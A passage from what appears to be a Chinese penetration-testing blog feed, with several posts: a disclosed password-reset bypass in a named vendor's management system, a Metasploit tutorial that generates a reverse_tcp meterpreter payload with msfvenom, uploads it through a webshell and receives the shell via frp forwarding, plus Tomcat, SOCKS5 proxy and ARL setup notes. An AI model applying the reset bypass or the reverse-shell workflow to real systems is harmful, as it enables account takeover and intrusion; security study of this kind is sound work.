        <content type="html"><![CDATA[<p><strong>免责声明：由于传播、利用本文所发布的而造成的任何直接或者间接的后果及损失，均由使用者本人承担</strong></p><h2 id="一个在野0day"><a href="#一个在野0day" class="headerlink" title="一个在野0day"></a>一个在野0day</h2><p>找不到厂商，貌似这个厂商倒闭了</p><p>厂商：北京康邦科技有限公司统一管理系统</p><p>发现过程：<strong>还是抓包分析分析再分析</strong></p><p>因为忘了截图，大概描述一下：</p><p>一直抓包看http历史，结合js，它不同的数字对应不同的路径，那些路径访问后直接跳转，但是，当用户名是正确的时候，也就是第二步，核实了有这个用户名，为啥这样发现的呢，因为cookie有一处细节，输入正常用户的cookie比错误用户名要长度要长(多了一个键值对)，就可以直接访问那个路径，因此触发了任意密码重置</p><h3 id="实现："><a href="#实现：" class="headerlink" title="实现："></a>实现：</h3><p><img src="/2023/03/07/%E5%8F%88%E4%B8%80%E4%B8%AA%E5%9C%A8%E9%87%8E0day/img/1.png" alt="image-20240322112103611"></p><p><img src="/2023/03/07/%E5%8F%88%E4%B8%80%E4%B8%AA%E5%9C%A8%E9%87%8E0day/img/2.png" alt="image-20240322112120187"></p><p>​</p><p>​注意这里 输入admin之后，点击了继续之后！</p><p>​再通过根路径拼接访问 <code>uum/users_selfService!isCorrect.action</code> 直接访问更改密码路径</p><p>​选择存在的账号更改即可</p><p><img src="/2023/03/07/%E5%8F%88%E4%B8%80%E4%B8%AA%E5%9C%A8%E9%87%8E0day/img/3.png" alt="image-20240322112300644"></p><p>然后用更改好的登录即可</p><p><img src="/2023/03/07/%E5%8F%88%E4%B8%80%E4%B8%AA%E5%9C%A8%E9%87%8E0day/img/4.png" alt="image-20240322112511406"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>一些src实战记录</title>
      <link href="/2023/01/15/%E4%B8%80%E4%BA%9Bsrc%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/01/15/%E4%B8%80%E4%BA%9Bsrc%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="前言-感慨"><a href="#前言-感慨" class="headerlink" title="前言&amp;感慨"></a>前言&amp;感慨</h2><p>不知不觉中，接触安全行业并持续坚持学习，已经就要三年了</p><p>可以说技术让我重生，又来了主动学习与思考反思</p><p>使我把终身耕耘在渗透测试行业作为人生目标</p><p>这三年我不管学的多学的少，日拱一卒，没有一天的停下来的</p><p>虽然现在也很菜，套模板挖洞，也没有什么技术含量，但我坚信 以后绝不止这些</p><p>在这三年的过程中，我特别感谢三个人</p><p>一位是我的高中老师，在我迷茫与无知的时候，向我讲述了黑客技术与CTF，我由此入门</p><p>一位是F_Dao师傅，对我入门以及学习期间的指导与规划，我由此进步</p><p>一位是j0o1ey师傅，偶像与风向标，我由此新生</p><p>思考之后，我准备把自己保留的挖src保留下的报告，对外公开，有些我并没有保存</p><p>我以为漏洞平台就会有，但不知道过了半个月他们就会将漏洞细节删除，导致现在很多漏洞案例遗失，我认为，应该参考hackone平台，始终对外开放，让任何喜欢这个技术，并渴望进步的人，都能得到充分获取知识的机会。</p><p>后面没特别情况就准备放弃挖src一段时间，学其他方向了</p><p>帮助大家，就像很多师傅无条件帮助我一样</p><p>希望大家也都保持善良，对待求知若渴虚心若愚的同学，可以伸出援助之手，做一个善良的人</p><p>链接：<a href="https://q1al4.lanzout.com/ieVpQ1s6sscj">https://q1al4.lanzout.com/ieVpQ1s6sscj</a></p><p>大概有80多个案例</p><p><img src="/2023/01/15/%E4%B8%80%E4%BA%9Bsrc%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/img/1.png" alt="image-20240322104906665"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>解析HTTP请求header错误</title>
      <link href="/2022/11/22/%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82header%E9%94%99%E8%AF%AF/"/>
      <url>/2022/11/22/%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82header%E9%94%99%E8%AF%AF/</url>
      
        <content type="html"><![CDATA[<p><strong>注：微信公众号，csdn原创以及本博客，都为我本人。</strong> 转载请邮件告知！</p><h3 id="windows下tomcat启动但无法访问localhost的问题"><a href="#windows下tomcat启动但无法访问localhost的问题" class="headerlink" title="windows下tomcat启动但无法访问localhost的问题"></a>windows下tomcat启动但无法访问localhost的问题</h3><ul><li>环境变量一切正常</li><li>127.0.0.1可以访问，内网ip可以访问</li></ul><p>这个方法<em>不用改源码，不用改项目，不用重装，不用改端口！</em></p><p>希望可以帮到解决问题的朋友和师傅们</p><h4 id="START"><a href="#START" class="headerlink" title="START"></a>START</h4><h5 id="访问错误："><a href="#访问错误：" class="headerlink" title="访问错误："></a><strong>访问错误：</strong></h5><p>​<img src="/2022/11/22/%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82header%E9%94%99%E8%AF%AF/img/1.png" alt="在这里插入图片描述"></p><h5 id="报错内容："><a href="#报错内容：" class="headerlink" title="报错内容："></a><strong>报错内容</strong>：</h5><p>​logs报错信息</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">22</span>-Nov-<span class="number">2022</span> <span class="number">17</span>:<span class="number">19</span>:<span class="number">26.972</span> 信息 [http-nio-<span class="number">8080</span>-exec-<span class="number">1</span>] org.apache.coyote.http11.Http11Processor.service 解析 HTTP 请求 header 错误</span><br><span class="line"> 注意：HTTP请求解析错误的进一步发生将记录在DEBUG级别。</span><br><span class="line">java.lang.IllegalArgumentException: 在方法名称[0x160x030x010x020x000x010x000x010xfc0x030x030xf10x150x81/<span class="number">0xb9</span>?0x990x8fsn40xbf?0x010x1eU3u0xbd0xcb0xe4q0xbeu0xb70x180xccJj0xc50xe70xde ]中发现无效的字符串, HTTP 方法名必须是有效的符号.</span><br><span class="line">at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:<span class="number">434</span>)</span><br><span class="line">at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:<span class="number">513</span>)</span><br><span class="line">at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:<span class="number">65</span>)</span><br><span class="line">at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:<span class="number">885</span>)</span><br><span class="line">at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:<span class="number">1693</span>)</span><br><span class="line">at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:<span class="number">49</span>)</span><br><span class="line">at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:<span class="number">1191</span>)</span><br><span class="line">at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:<span class="number">659</span>)</span><br><span class="line">at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:<span class="number">61</span>)</span><br><span class="line">at java.lang.Thread.run(Unknown Source)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>终端报错信息</p><p><img src="/2022/11/22/%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82header%E9%94%99%E8%AF%AF/img/2.png" alt="在这里插入图片描述"></p><h5 id="问题核心："><a href="#问题核心：" class="headerlink" title="问题核心："></a>问题核心：</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">org.apache.coyote.http11.Http11Processor.service 解析 HTTP 请求 header 错误</span><br><span class="line"> 注意：HTTP请求解析错误的进一步发生将记录在DEBUG级别。</span><br><span class="line">java.lang.IllegalArgumentException: 在方法名称[0x160x030x010x020x000x010x000x010xfc0x030x030xf10x150x81/<span class="number">0xb9</span>?0x990x8fsn40xbf?0x010x1eU3u0xbd0xcb0xe4q0xbeu0xb70x180xccJj0xc50xe70xde ]中发现无效的字符串, HTTP 方法名必须是有效的符号.</span><br></pre></td></tr></table></figure><p>使用127.0.0.1:8080访问</p><p><img src="/2022/11/22/%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82header%E9%94%99%E8%AF%AF/img/3.png" alt="在这里插入图片描述"></p><p>使用内网ip访问</p><p><img src="/2022/11/22/%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82header%E9%94%99%E8%AF%AF/img/4.png" alt="在这里插入图片描述"></p><p><strong>单单localhost不能访问，但是其他可以成功访问，怀着不逃避问题的心态，自己摸索好久，借助各类翻车的经验，以及搜索引擎的内容，终于解决:</strong></p><h5 id="解决流程："><a href="#解决流程：" class="headerlink" title="解决流程："></a>解决流程：</h5><p>​注意观察访问成功的url信息</p><p>​<img src="/2022/11/22/%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82header%E9%94%99%E8%AF%AF/img/5.png" alt="在这里插入图片描述"><img src="/2022/11/22/%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82header%E9%94%99%E8%AF%AF/img/6.png" alt="在这里插入图片描述"></p><p>​失败的localhost他是</p><p>​<img src="/2022/11/22/%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82header%E9%94%99%E8%AF%AF/img/7.png" alt="在这里插入图片描述"></p><p>得出结论：<strong>使用http访问</strong>！！</p><p>然后又是坑<img src="/2022/11/22/%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82header%E9%94%99%E8%AF%AF/img/8.png" alt="在这里插入图片描述"></p><p>这里有一个小细节，加载出了ico，说明是可以访问的，但是点击之后</p><p><img src="/2022/11/22/%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82header%E9%94%99%E8%AF%AF/img/9.png" alt="在这里插入图片描述"></p><p>自动加入了https<br>试了好多次 输入http一直跳转https</p><p>经过我无数次采坑与学习 整合各种文章，得出办法！</p><p><strong>访问谷歌的 chrome:&#x2F;&#x2F;net-internals&#x2F;#hsts</strong></p><p><img src="/2022/11/22/%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82header%E9%94%99%E8%AF%AF/img/10.png" alt="在这里插入图片描述"></p><p>在这里的意思是说 对站点安全策略的保护，默认localhost拥有ssl保护<br>然后输入localhost删掉就好了</p><p><img src="/2022/11/22/%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82header%E9%94%99%E8%AF%AF/img/11.png" alt="在这里插入图片描述"></p><p>成功</p><p><img src="/2022/11/22/%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82header%E9%94%99%E8%AF%AF/img/12.png" alt="在这里插入图片描述"></p><p>tip:遇到浏览器访问这块的问题，包括渗透测试方面，多换几个浏览器访问试试</p><h3 id="end"><a href="#end" class="headerlink" title="end"></a><em><strong>end</strong></em></h3>]]></content>
      
      
      <categories>
          
          <category> 环境搭建 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu搭建Socks5代理服务器</title>
      <link href="/2022/10/30/Ubuntu%E6%90%AD%E5%BB%BASocks5%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
      <url>/2022/10/30/Ubuntu%E6%90%AD%E5%BB%BASocks5%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<p><strong>注：微信公众号，csdn，freebuf原创以及本博客，都为我本人。</strong> 转载请邮件告知！</p><p><strong>免责声明：由于传播、利用本文所发布的而造成的任何直接或者间接的后果及损失，均由使用者本人承担</strong></p><h3 id="使用Ubuntu搭建Socks5代理服务器"><a href="#使用Ubuntu搭建Socks5代理服务器" class="headerlink" title="使用Ubuntu搭建Socks5代理服务器"></a>使用Ubuntu搭建Socks5代理服务器</h3><p>​国内vps做教程，请遵守我国互联网法律法规，切勿使用本教程研究非法网络活动，如有，博主不承担任何责任。</p><h4 id="START"><a href="#START" class="headerlink" title="START"></a>START</h4><h4 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h4><p>​使用到的工具</p><ul><li><p>VPS</p></li><li><p>Dante</p></li><li><p>Proxifier</p></li></ul><h5 id="安装dante"><a href="#安装dante" class="headerlink" title="安装dante"></a>安装dante</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install dante-server</span><br></pre></td></tr></table></figure><h5 id="配置dante"><a href="#配置dante" class="headerlink" title="配置dante"></a>配置dante</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/danted.conf</span><br></pre></td></tr></table></figure><p>建议最好提前先备份一下</p><p>​<img src="/2022/10/30/Ubuntu%E6%90%AD%E5%BB%BASocks5%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8/img/1.png" alt="img"></p><p>这个文件270行，非常的多，需要一点点分析其中关于配置的内容</p><p>建议全删了vi命令 <code>：1,%d</code>，去找一份然后翻译修改<br>结合参考文件和百度，需要如下地方做出整改</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">logoutput: /var/log/socks.log</span><br><span class="line">internal: &lt;vps的上网的网卡&gt; port = 连接时的端口</span><br><span class="line">external: &lt;vps的上网的网卡&gt;</span><br><span class="line">clientmethod: none</span><br><span class="line">socksmethod: username</span><br><span class="line">user.privileged: root</span><br><span class="line">user.notprivileged: &lt;连接时的使用的用户名&gt;</span><br><span class="line"></span><br><span class="line">client pass &#123;</span><br><span class="line">        from: 0.0.0.0/0 to: 0.0.0.0/0</span><br><span class="line">        log: error connect disconnect</span><br><span class="line">&#125;</span><br><span class="line">client block &#123;</span><br><span class="line">        from: 0.0.0.0/0 to: 0.0.0.0/0</span><br><span class="line">        log: connect error</span><br><span class="line">&#125;</span><br><span class="line">socks pass &#123;</span><br><span class="line">        from: 0.0.0.0/0 to: 0.0.0.0/0</span><br><span class="line">        command: bind connect udpassociate</span><br><span class="line">        log: error connect disconnect</span><br><span class="line">        socksmethod: username</span><br><span class="line">&#125;</span><br><span class="line">socks block &#123;</span><br><span class="line">        from: 0.0.0.0/0 to: 0.0.0.0/0</span><br><span class="line">        log: connect error</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>user.notprivileged中不建议使用系统登录的账户，为了安全起见，新建一个专门用户连接socks5的用户</p><p><img src="/2022/10/30/Ubuntu%E6%90%AD%E5%BB%BASocks5%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8/img/2.png" alt="2"></p><p>接着去设置密码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd px </span><br></pre></td></tr></table></figure><p>之后去修改&#x2F;etc&#x2F;passwd文件，禁止这个账户登录系统(安全起见)</p><p><img src="/2022/10/30/Ubuntu%E6%90%AD%E5%BB%BASocks5%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8/img/3.png" alt="在这里插入图片描述"></p><p>测试效果</p><p><img src="/2022/10/30/Ubuntu%E6%90%AD%E5%BB%BASocks5%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8/img/4.png" alt="在这里插入图片描述"></p><p>成功无法登录</p><h5 id="测试与使用"><a href="#测试与使用" class="headerlink" title="测试与使用"></a>测试与使用</h5><p>​<img src="/2022/10/30/Ubuntu%E6%90%AD%E5%BB%BASocks5%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8/img/5.png" alt="在这里插入图片描述"></p><p>​<img src="/2022/10/30/Ubuntu%E6%90%AD%E5%BB%BASocks5%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8/img/6.png" alt="在这里插入图片描述"></p><p>​<img src="/2022/10/30/Ubuntu%E6%90%AD%E5%BB%BASocks5%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8/img/7.png" alt="在这里插入图片描述"></p><p>​到这里就成功了。</p><p>​去使用Proxifier连接即可使用</p><p>​<img src="/2022/10/30/Ubuntu%E6%90%AD%E5%BB%BASocks5%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8/img/8.png" alt="在这里插入图片描述"></p><p>​<strong>Address是我这台机器的外网ip，如果你的vps ip不止一个，可以在dante的conf文件中可以去指定网卡选择不同的ip使用。</strong></p><p><strong>check一下</strong></p><p>​<img src="/2022/10/30/Ubuntu%E6%90%AD%E5%BB%BASocks5%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8/img/9.png" alt="在这里插入图片描述"></p><p>​到这里注意是卡死的，因为测试时Proxifier访问google了，我这台机器是北京的，懂得都懂。</p><p>​直接OK下一步</p><p>​<img src="/2022/10/30/Ubuntu%E6%90%AD%E5%BB%BASocks5%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8/img/10.png" alt="在这里插入图片描述"></p><p>​成功。后面的扩展使用，就不赘述了，只需要利用Proxifier指定不同的程序代理流量就好了，</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">参考，感谢：</span><br><span class="line">https://www.baidu.com/</span><br><span class="line">http://wiki.kartbuilding.net/Dante_Socks_Server</span><br><span class="line">https://www.cnblogs.com/zhangjiagang/p/15169572.html</span><br><span class="line">https://www.keepnight.com/archives/657/</span><br></pre></td></tr></table></figure><h4 id="end"><a href="#end" class="headerlink" title="end"></a>end</h4>]]></content>
      
      
      <categories>
          
          <category> 环境搭建 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>内网MSF接收反向shell(突发奇想的实验)</title>
      <link href="/2022/10/27/%E5%86%85%E7%BD%91MSF%E6%8E%A5%E6%94%B6%E5%8F%8D%E5%90%91shell(%E7%AA%81%E5%8F%91%E5%A5%87%E6%83%B3%E7%9A%84%E5%AE%9E%E9%AA%8C)/"/>
      <url>/2022/10/27/%E5%86%85%E7%BD%91MSF%E6%8E%A5%E6%94%B6%E5%8F%8D%E5%90%91shell(%E7%AA%81%E5%8F%91%E5%A5%87%E6%83%B3%E7%9A%84%E5%AE%9E%E9%AA%8C)/</url>
      
        <content type="html"><![CDATA[<p><strong>注：微信公众号，csdn，freebuf原创以及本博客，都为我本人。</strong> 转载请邮件告知！</p><p><strong>免责声明：由于传播、利用本文所发布的而造成的任何直接或者间接的后果及损失，均由使用者本人承担</strong></p><h3 id="关于处于内网环境的MSF接收反向连接shell"><a href="#关于处于内网环境的MSF接收反向连接shell" class="headerlink" title="关于处于内网环境的MSF接收反向连接shell"></a>关于处于内网环境的MSF接收反向连接shell</h3><p>​内网渗透两位主流工具无非cs与msf，CobaltStrike与Metasploit不一样，cs架构的它teamserver直接部署在外网ip上，做攻击使用连接方便，而msf没有。</p><p>​另一方面，对一部分人来说，这种方法的作用某种情况下确确实实是多余的，可能是我的学习方式跟大家不大相同，<strong>刹那间的突发奇想，自己也就研究了一下</strong>，也是希望能帮助到想到这个问题的小伙伴。</p><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><ul><li><p>大家的MSF也几乎都是处于虚拟机中的内网环境，攻击的用处也大都是和cobaltstrike传递shell做后渗透。</p></li><li><p>但是，当我们的<strong>主动攻击</strong>目标是外网机器，或者说是不同且不通的内网环境，<strong>这种情况，我们该如何去接收反向的shell连接</strong>呢。</p><p><strong>网上搜索关于msf教程，也通常都是在内网中做的演示</strong>，但是在<strong>渗透过程中不乏会遇到需要利用msf的exploit进行漏洞利用的过程</strong>，本文应运而生，文章创作目的意在帮助需要的小伙伴。</p></li></ul><h4 id="START"><a href="#START" class="headerlink" title="START"></a>START</h4><p>核心在于流量转发，使用到的工具</p><ul><li>frp</li><li>独立公网IP的vps</li><li>xshell</li><li>蚁剑</li></ul><h5 id="frp配置、"><a href="#frp配置、" class="headerlink" title="frp配置、"></a>frp配置、</h5><p>​frp的配置，使其可以互通</p><p>​首先在内网kali和自己的vps上下载好frp，没钱买vps就去用提供端口转发的第三方服务，网上太多了。</p><p><img src="/2022/10/27/%E5%86%85%E7%BD%91MSF%E6%8E%A5%E6%94%B6%E5%8F%8D%E5%90%91shell(%E7%AA%81%E5%8F%91%E5%A5%87%E6%83%B3%E7%9A%84%E5%AE%9E%E9%AA%8C)/img/1.png" alt="在这里插入图片描述"></p><p>​简单配置一下</p><p>​vps：frps配置</p><p>​<img src="/2022/10/27/%E5%86%85%E7%BD%91MSF%E6%8E%A5%E6%94%B6%E5%8F%8D%E5%90%91shell(%E7%AA%81%E5%8F%91%E5%A5%87%E6%83%B3%E7%9A%84%E5%AE%9E%E9%AA%8C)/img/2.png" alt="在这里插入图片描述"></p><p>​内网kali：frpc配置</p><p>​<img src="/2022/10/27/%E5%86%85%E7%BD%91MSF%E6%8E%A5%E6%94%B6%E5%8F%8D%E5%90%91shell(%E7%AA%81%E5%8F%91%E5%A5%87%E6%83%B3%E7%9A%84%E5%AE%9E%E9%AA%8C)/img/3.png" alt="在这里插入图片描述"></p><p>​连接vps的7000端口通信，并且把本地的2222端口映射到vps的8000端口</p><p>​接下来测试一下连通性：</p><p>​<img src="/2022/10/27/%E5%86%85%E7%BD%91MSF%E6%8E%A5%E6%94%B6%E5%8F%8D%E5%90%91shell(%E7%AA%81%E5%8F%91%E5%A5%87%E6%83%B3%E7%9A%84%E5%AE%9E%E9%AA%8C)/img/4.png" alt="在这里插入图片描述"></p><p>​连通是成功的</p><p>​注意：如果遇到ping通可以，但是nc不能通信，大家可以多换一个端口尝试</p><p>​</p><h5 id="木马生成、"><a href="#木马生成、" class="headerlink" title="木马生成、"></a>木马生成、</h5><p>​生成msf的木马</p><p>​最简单的命令生成一个</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=外网IP LPORT=外网端口 -f elf &gt; /test/shell.elf</span><br></pre></td></tr></table></figure><p>​留意这个监听payload：<code>linux/x64/meterpreter/reverse_tcp</code></p><p>​<img src="/2022/10/27/%E5%86%85%E7%BD%91MSF%E6%8E%A5%E6%94%B6%E5%8F%8D%E5%90%91shell(%E7%AA%81%E5%8F%91%E5%A5%87%E6%83%B3%E7%9A%84%E5%AE%9E%E9%AA%8C)/img/5.png" alt="在这里插入图片描述"></p><p>​之后把shell.elf下载到本地，再通过蚁剑上传到目标机器</p><p>​<img src="/2022/10/27/%E5%86%85%E7%BD%91MSF%E6%8E%A5%E6%94%B6%E5%8F%8D%E5%90%91shell(%E7%AA%81%E5%8F%91%E5%A5%87%E6%83%B3%E7%9A%84%E5%AE%9E%E9%AA%8C)/img/6.png" alt="在这里插入图片描述"></p><p>​</p><h5 id="流量转发、"><a href="#流量转发、" class="headerlink" title="流量转发、"></a>流量转发、</h5><p>​启动frp进行流量转发</p><p>​<img src="/2022/10/27/%E5%86%85%E7%BD%91MSF%E6%8E%A5%E6%94%B6%E5%8F%8D%E5%90%91shell(%E7%AA%81%E5%8F%91%E5%A5%87%E6%83%B3%E7%9A%84%E5%AE%9E%E9%AA%8C)/img/7.png" alt="在这里插入图片描述"></p><h5 id="测试上线、"><a href="#测试上线、" class="headerlink" title="测试上线、"></a>测试上线、</h5><p>​开启msf的监听，等待上线</p><p>​<img src="/2022/10/27/%E5%86%85%E7%BD%91MSF%E6%8E%A5%E6%94%B6%E5%8F%8D%E5%90%91shell(%E7%AA%81%E5%8F%91%E5%A5%87%E6%83%B3%E7%9A%84%E5%AE%9E%E9%AA%8C)/img/8.png" alt="在这里插入图片描述"></p><p>​这个时候注意默认的payload，是跟我们生成木马时使用的不一样，<strong>原则上用什么监听模式生成木马，就用什么监听模式接受反弹shell</strong>，所以要改成一样的。</p><p>​<img src="/2022/10/27/%E5%86%85%E7%BD%91MSF%E6%8E%A5%E6%94%B6%E5%8F%8D%E5%90%91shell(%E7%AA%81%E5%8F%91%E5%A5%87%E6%83%B3%E7%9A%84%E5%AE%9E%E9%AA%8C)/img/9.png" alt="在这里插入图片描述"></p><p>​我们选择监听本地，之所以是2222端口，因为我们前面讲到转发的本地端口是2222</p><p>​<img src="/2022/10/27/%E5%86%85%E7%BD%91MSF%E6%8E%A5%E6%94%B6%E5%8F%8D%E5%90%91shell(%E7%AA%81%E5%8F%91%E5%A5%87%E6%83%B3%E7%9A%84%E5%AE%9E%E9%AA%8C)/img/10.png" alt="在这里插入图片描述"></p><p>​目标机运行上传的shell.elf</p><p>​<img src="/2022/10/27/%E5%86%85%E7%BD%91MSF%E6%8E%A5%E6%94%B6%E5%8F%8D%E5%90%91shell(%E7%AA%81%E5%8F%91%E5%A5%87%E6%83%B3%E7%9A%84%E5%AE%9E%E9%AA%8C)/img/11.png" alt="在这里插入图片描述"></p><p>​成功接收到了shell</p><p>​<img src="/2022/10/27/%E5%86%85%E7%BD%91MSF%E6%8E%A5%E6%94%B6%E5%8F%8D%E5%90%91shell(%E7%AA%81%E5%8F%91%E5%A5%87%E6%83%B3%E7%9A%84%E5%AE%9E%E9%AA%8C)/img/12.png" alt="在这里插入图片描述"></p><p>OK 结束</p><p>这是执行载荷去接收shell的案例，其实用执行命令反弹shell的话（比如ms17010），（不只是MSF）还有一些原理和实现方法是一样的，主要是端口转发。</p><h3 id="end"><a href="#end" class="headerlink" title="end"></a><em>end</em></h3>]]></content>
      
      
      <categories>
          
          <category> 环境搭建 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>灯塔资产系统（ARL）部署</title>
      <link href="/2021/07/11/%E7%81%AF%E5%A1%94%E8%B5%84%E4%BA%A7%E7%B3%BB%E7%BB%9F%EF%BC%88ARL%EF%BC%89%E9%83%A8%E7%BD%B2/"/>
      <url>/2021/07/11/%E7%81%AF%E5%A1%94%E8%B5%84%E4%BA%A7%E7%B3%BB%E7%BB%9F%EF%BC%88ARL%EF%BC%89%E9%83%A8%E7%BD%B2/</url>
      
        <content type="html"><![CDATA[<p><strong>注：微信公众号，csdn原创以及本博客，都为我本人。</strong> 转载请邮件告知！</p><p><strong>免责声明：由于传播、利用本文所发布的而造成的任何直接或者间接的后果及损失，均由使用者本人承担</strong></p><h3 id="ARL-Asset-Reconnaissance-Lighthouse"><a href="#ARL-Asset-Reconnaissance-Lighthouse" class="headerlink" title="ARL (Asset Reconnaissance Lighthouse)"></a>ARL (Asset Reconnaissance Lighthouse)</h3><p>​资产侦察灯塔系统旨在快速侦察与目标关联的互联网资产，构建基础资产信息库。 协助甲方安全团队或者渗透测试人员有效侦察和检索资产，发现存在的薄弱点和攻击面。</p><ul><li>这是一个非常棒的信息收集工具，特别是在挖掘src的时候，前期的信息收集，个人感觉这款系统效果显著。集成于web界面，指纹识别，fofa采集，敏感泄露，子域名，c段，截图等…各种功能应有尽有。</li></ul><h4 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h4><ul><li>官方Github地址：<a href="https://github.com/TophantTechnology/ARL">https://github.com/TophantTechnology/ARL</a><ol><li>官方标明，目前暂不支持Windows Server</li><li>本文使用的系统是Ubuntu x64,根据官方建议使用docker部署</li><li>建议使用云服务器，这样可以用担心用电等乱七八杂的问题，可以没日没夜的跑资产</li></ol></li></ul><h4 id="开始："><a href="#开始：" class="headerlink" title="开始："></a>开始：</h4><p>​<strong>本文将从三步来完成ARL的部署与搭建</strong></p><h5 id="一、安装docker"><a href="#一、安装docker" class="headerlink" title="一、安装docker"></a>一、安装docker</h5><p>​使用<a href="https://so.csdn.net/so/search?q=docker&spm=1001.2101.3001.7020">docker</a>部署，先要<strong>安装docker</strong>，以下的docker的安装教程，会的小伙伴可以跳过。</p><ol><li><p><code>sudo apt-get update</code></p></li><li><p><code>sudo apt-get -y install apt-transport-https ca-certificates curl software-properties-common</code></p></li><li><p><code>curl -fsSL http://mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg | sudo apt-key add -</code></p></li><li><p><code>sudo add-apt-repository &quot;deb [arch=amd64] http://mirrors.aliyun.com/docker-ce/linux/ubuntu $(lsb_release -cs) stable&quot;</code></p></li><li><p><code>sudo apt-get -y update</code></p></li><li><p><code>sudo apt-get -y install docker-ce</code></p></li><li><p>这样的话docker就安装好了</p><p><img src="/2021/07/11/%E7%81%AF%E5%A1%94%E8%B5%84%E4%BA%A7%E7%B3%BB%E7%BB%9F%EF%BC%88ARL%EF%BC%89%E9%83%A8%E7%BD%B2/img/1.png" 